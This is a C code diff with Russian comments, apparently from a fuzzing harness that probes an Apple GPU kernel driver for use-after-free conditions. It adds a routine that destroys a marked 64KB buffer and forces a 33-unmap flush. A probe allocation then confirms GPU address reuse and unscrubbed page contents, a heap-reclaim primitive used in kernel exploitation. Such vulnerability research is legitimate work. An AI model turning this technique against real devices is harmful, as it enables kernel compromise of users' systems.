@@ -19108,7 +19108,12 @@ static uint64_t duf_recreate(dufx *x, const dufcls *k) {   // (e)
         uint8_t *cp = NULL;
         uint32_t r = gpu_resource2(x->c, 0x10000, &g, &cp);
         if (cp) memset(cp, 0x41, 0x10000);
-        LOG("[duf]   recreated rid %u (cpu %p)", r, cp);
+        // v140: GPUVA-reuse — дешёвый однозначный тест page reuse из
+        // AGXUAT-арены, не зависящий от bzero-on-free (см. retirement-разбор)
+        LOG("[duf]   recreated rid %u GPUVA 0x%llx (cpu %p) — victim GPUVA 0x%llx: %s",
+            r, (unsigned long long)g, cp, (unsigned long long)x->gvaM,
+            g && g == x->gvaM ? "GPUVA REUSED (page reclaim confirmed)" :
+            (g && g == x->gvaW ? "witness GPUVA?!" : "fresh GPUVA"));
         return r;
     }
     if (k->dsel == 7) {
@@ -19127,6 +19132,7 @@ static uint64_t duf_recreate(dufx *x, const dufcls *k) {   // (e)
     LOG("[duf]   recreated nqid %llu", nq);
     return nq;
 }
+static void duf_reclaim_flush(dufx *x);
 static void duf_run_class(dufx *x, const dufcls *k) {
     LOG("[duf] === class %s: destroy sel%u (main 0x%llx witness 0x%llx) ===",
         k->nm, k->dsel, (unsigned long long)k->idM, (unsigned long long)k->idW);
@@ -19161,6 +19167,60 @@ static void duf_run_class(dufx *x, const dufcls *k) {
         nid && nid == k->idM ? "ID REUSED" : (nid ? "fresh id" : "FAILED"));
     duf_checkall(x, "after e-recreate");
     duf_kill1(x, k->dsel, nid, "e-cleanup-new", 0);
+    if (k->dsel == 9) duf_reclaim_flush(x);
+}
+
+// V140: (f) AGXUAT reclaim flush. Статика (AGXUAT::queueUnmap/process):
+// unmap'ы копятся до 32 и только потом PTE clear + возврат страниц в
+// inline GPU-арену. Одиночный destroy страницы не возвращает — значит
+// reuse-тест имеет смысл только после форс-флаша (33+ unmap). Сценарий:
+// victim 64KB с маркером 0x41 → destroy → 33× (create+destroy same size)
+// → probe-create: совпадение GPUVA = reclaim подтверждён (не зависит от
+// bzero-on-free); остатки 0x41 в probe = страницы не скрабятся.
+static void duf_reclaim_flush(dufx *x) {
+    if (!duf_next()) return;
+    long n = duf_cn - 1;
+    LOG("[duf] case #%ld f-reclaim: victim+flush+probe (AGXUAT process force)", n);
+    fsync(fileno(stderr));
+    uint64_t gv = 0;
+    uint8_t *cv = NULL;
+    uint32_t rv = gpu_resource2(x->c, 0x10000, &gv, &cv);
+    if (!rv) { LOG("[duf]   f: victim alloc failed"); return; }
+    if (cv) memset(cv, 0x41, 0x10000);
+    LOG("[duf]   f: victim rid %u GPUVA 0x%llx cpu %p (marked 0x41)", rv,
+        (unsigned long long)gv, cv);
+    fsync(fileno(stderr));
+    uint64_t id = rv;
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, 9, &id, 1, NULL, NULL);
+    LOG("[duf]   f: victim destroyed kr 0x%08x; flushing 33 unmaps", (unsigned)kr);
+    fsync(fileno(stderr));
+    uint64_t first_g = 0;
+    for (int i = 0; i < 33; i++) {
+        uint64_t g = 0;
+        uint8_t *cp = NULL;
+        uint32_t r = gpu_resource2(x->c, 0x10000, &g, &cp);
+        if (!r) { LOG("[duf]   f: flush alloc %d failed", i); break; }
+        if (!i) first_g = g;
+        id = r;
+        IOConnectCallScalarMethod(x->c, 9, &id, 1, NULL, NULL);
+    }
+    LOG("[duf]   f: flush done (first flush GPUVA 0x%llx — %s)",
+        (unsigned long long)first_g,
+        first_g == gv ? "IMMEDIATE VA REUSE pre-process" : "no pre-process reuse");
+    fsync(fileno(stderr));
+    uint64_t gp = 0;
+    uint8_t *cpp = NULL;
+    uint32_t rp = gpu_resource2(x->c, 0x10000, &gp, &cpp);
+    long rem = -1;
+    if (cpp) {   // скраб-тест: читаем ДО любой записи
+        rem = 0;
+        for (long i = 0; i < 0x10000; i++) if (cpp[i] == 0x41) rem++;
+    }
+    LOG("[duf]   f: probe rid %u GPUVA 0x%llx — %s; 0x41 remnants %ld/65536 %s",
+        rp, (unsigned long long)gp,
+        gp == gv ? "VICTIM GPUVA REUSED (reclaim confirmed)" : "no victim VA reuse",
+        rem, rem > 0 ? "[PAGES NOT SCRUBBED]" : "");
+    fsync(fileno(stderr));
 }
 static void p_destroyuaf(void) {
     duf_skip = atol(getenv("FUZZ_DESTROYUAF_SKIP") ?: "0");
